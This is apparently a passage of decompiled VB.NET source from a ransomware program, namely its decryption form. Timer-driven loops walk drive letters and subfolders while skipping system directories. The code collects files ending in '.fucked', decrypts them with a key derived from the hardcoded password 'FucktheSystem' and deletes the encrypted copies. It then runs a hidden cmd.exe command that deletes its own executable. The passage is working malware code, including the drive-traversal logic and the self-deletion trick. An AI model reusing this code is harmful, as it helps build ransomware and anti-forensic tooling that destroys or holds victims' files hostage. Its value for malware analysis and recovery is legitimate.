						If Not text23.EndsWith("Bin") AndAlso Not text23.EndsWith("indows") AndAlso Not text23.EndsWith("tings") AndAlso Not text23.EndsWith("System Volume Information") AndAlso Not text23.EndsWith("cache") AndAlso Not text23.EndsWith("very") AndAlso Not text23.EndsWith("rogram Files (x86)") AndAlso Not text23.EndsWith("rogram Files") AndAlso Not text23.EndsWith("boot") AndAlso Not text23.EndsWith("efi") AndAlso Not text23.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text23)
							Me.ListBox9.Items.Add(text23)
						End If
					Next
				Finally
					Dim enumerator23 As IEnumerator(Of String)
					If enumerator23 IsNot Nothing Then
						enumerator23.Dispose()
					End If
				End Try
			Catch ex23 As Exception
			End Try
			Try
				Try
					For Each text24 As String In MyProject.Computer.FileSystem.GetDirectories("X:\")
						If Not text24.EndsWith("Bin") AndAlso Not text24.EndsWith("indows") AndAlso Not text24.EndsWith("tings") AndAlso Not text24.EndsWith("System Volume Information") AndAlso Not text24.EndsWith("cache") AndAlso Not text24.EndsWith("very") AndAlso Not text24.EndsWith("rogram Files (x86)") AndAlso Not text24.EndsWith("rogram Files") AndAlso Not text24.EndsWith("boot") AndAlso Not text24.EndsWith("efi") AndAlso Not text24.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text24)
							Me.ListBox9.Items.Add(text24)
						End If
					Next
				Finally
					Dim enumerator24 As IEnumerator(Of String)
					If enumerator24 IsNot Nothing Then
						enumerator24.Dispose()
					End If
				End Try
			Catch ex24 As Exception
			End Try
			Try
				Try
					For Each text25 As String In MyProject.Computer.FileSystem.GetDirectories("Y:\")
						If Not text25.EndsWith("Bin") AndAlso Not text25.EndsWith("indows") AndAlso Not text25.EndsWith("tings") AndAlso Not text25.EndsWith("System Volume Information") AndAlso Not text25.EndsWith("cache") AndAlso Not text25.EndsWith("very") AndAlso Not text25.EndsWith("rogram Files (x86)") AndAlso Not text25.EndsWith("rogram Files") AndAlso Not text25.EndsWith("boot") AndAlso Not text25.EndsWith("efi") AndAlso Not text25.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text25)
							Me.ListBox9.Items.Add(text25)
						End If
					Next
				Finally
					Dim enumerator25 As IEnumerator(Of String)
					If enumerator25 IsNot Nothing Then
						enumerator25.Dispose()
					End If
				End Try
			Catch ex25 As Exception
			End Try
			Try
				Try
					For Each text26 As String In MyProject.Computer.FileSystem.GetDirectories("Z:\")
						If Not text26.EndsWith("Bin") AndAlso Not text26.EndsWith("indows") AndAlso Not text26.EndsWith("tings") AndAlso Not text26.EndsWith("System Volume Information") AndAlso Not text26.EndsWith("cache") AndAlso Not text26.EndsWith("very") AndAlso Not text26.EndsWith("rogram Files (x86)") AndAlso Not text26.EndsWith("rogram Files") AndAlso Not text26.EndsWith("boot") AndAlso Not text26.EndsWith("efi") AndAlso Not text26.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text26)
							Me.ListBox9.Items.Add(text26)
						End If
					Next
				Finally
					Dim enumerator26 As IEnumerator(Of String)
					If enumerator26 IsNot Nothing Then
						enumerator26.Dispose()
					End If
				End Try
			Catch ex26 As Exception
			End Try
			Me.Timer1.Start()
		End Sub

		' Token: 0x060000C3 RID: 195 RVA: 0x0000AA54 File Offset: 0x00008C54
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar1.Maximum = Me.ListBox1.Items.Count
			If Me.ProgressBar1.Value = Me.ListBox1.Items.Count Then
				Me.Timer1.[Stop]()
				Me.Timer2.Start()
			Else
				Me.ListBox1.SelectedIndex = Me.ProgressBar1.Value
				Me.ListBox1.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox1.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox2.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar1.Increment(1)
			End If
		End Sub

		' Token: 0x060000C4 RID: 196 RVA: 0x0000AB84 File Offset: 0x00008D84
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar2.Maximum = Me.ListBox2.Items.Count
			If Me.ProgressBar2.Value = Me.ListBox2.Items.Count Then
				Me.Timer2.[Stop]()
				Me.Timer3.Start()
			Else
				Me.ListBox2.SelectedIndex = Me.ProgressBar2.Value
				Me.ListBox2.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox2.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox3.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar2.Increment(1)
			End If
		End Sub

		' Token: 0x060000C5 RID: 197 RVA: 0x0000ACB4 File Offset: 0x00008EB4
		Private Sub Timer3_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar3.Maximum = Me.ListBox3.Items.Count
			If Me.ProgressBar3.Value = Me.ListBox3.Items.Count Then
				Me.Timer3.[Stop]()
				Me.Timer4.Start()
			Else
				Me.ListBox3.SelectedIndex = Me.ProgressBar3.Value
				Me.ListBox3.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox3.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox4.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar3.Increment(1)
			End If
		End Sub

		' Token: 0x060000C6 RID: 198 RVA: 0x0000ADE4 File Offset: 0x00008FE4
		Private Sub Timer4_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar4.Maximum = Me.ListBox4.Items.Count
			If Me.ProgressBar4.Value = Me.ListBox4.Items.Count Then
				Me.Timer4.[Stop]()
				Me.Timer5.Start()
			Else
				Me.ListBox4.SelectedIndex = Me.ProgressBar4.Value
				Me.ListBox4.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox4.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox5.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar4.Increment(1)
			End If
		End Sub

		' Token: 0x060000C7 RID: 199 RVA: 0x0000AF14 File Offset: 0x00009114
		Private Sub Timer5_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar5.Maximum = Me.ListBox5.Items.Count
			If Me.ProgressBar5.Value = Me.ListBox5.Items.Count Then
				Me.Timer5.[Stop]()
				Me.Timer6.Start()
			Else
				Me.ListBox5.SelectedIndex = Me.ProgressBar5.Value
				Me.ListBox5.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox5.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox6.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar5.Increment(1)
			End If
		End Sub

		' Token: 0x060000C8 RID: 200 RVA: 0x0000B044 File Offset: 0x00009244
		Private Sub Timer6_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar6.Maximum = Me.ListBox6.Items.Count
			If Me.ProgressBar6.Value = Me.ListBox6.Items.Count Then
				Me.Timer6.[Stop]()
				Me.Timer7.Start()
			Else
				Me.ListBox6.SelectedIndex = Me.ProgressBar6.Value
				Me.ListBox6.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox6.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox7.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar6.Increment(1)
			End If
		End Sub

		' Token: 0x060000C9 RID: 201 RVA: 0x0000B174 File Offset: 0x00009374
		Private Sub Timer7_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar7.Maximum = Me.ListBox9.Items.Count
			If Me.ProgressBar7.Value = Me.ListBox9.Items.Count Then
				Me.Timer7.[Stop]()
				Me.Timer8.Start()
			Else
				Me.ListBox9.SelectedIndex = Me.ProgressBar7.Value
				Me.ListBox9.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox9.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetFiles(Me.filenamez)
							If text.EndsWith(".fucked") Then
								Me.ListBox8.Items.Add(text)
							End If
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar7.Increment(1)
			End If
		End Sub

		' Token: 0x060000CA RID: 202 RVA: 0x0000B2A0 File Offset: 0x000094A0
		Private Sub Timer8_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar9.Maximum = Me.ListBox8.Items.Count
			If Me.ProgressBar9.Value = Me.ListBox8.Items.Count Then
				Me.Timer1.Interval = 5000
				Me.Timer1.[Stop]()
				Process.Start(New ProcessStartInfo() With { .Arguments = "/C choice /C Y /N /D Y /T 3 & Del """ + Application.ExecutablePath.ToString() + """", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe" })
				Application.ExitThread()
			Else
				Me.ListBox8.SelectedIndex = Me.ProgressBar9.Value
				Me.ListBox8.SelectionMode = SelectionMode.One
				Dim text As String = Conversions.ToString(Me.ListBox8.SelectedItem)
				Try
					Dim array As Byte() = MyProject.Forms.Form1.CreateKey("FucktheSystem")
					Dim array2 As Byte() = MyProject.Forms.Form1.CreateIV("FucktheSystem")
					Dim text2 As String = Strings.Replace(text, ".fucked", "", 1, -1, CompareMethod.Binary)
					MyProject.Forms.Form1.EncryptOrDecryptFile(text, text2, array, array2, Form1.CryptoAction.ActionDecrypt)
					MyProject.Computer.FileSystem.DeleteFile(text)
				Catch ex As Exception
				End Try
				Me.ProgressBar9.Increment(1)
				Me.Label1.Text = text
				Me.Label3.Text = text
			End If
		End Sub

		' Token: 0x04000061 RID: 97
		Private filenamez As String
	End Class
End Namespace
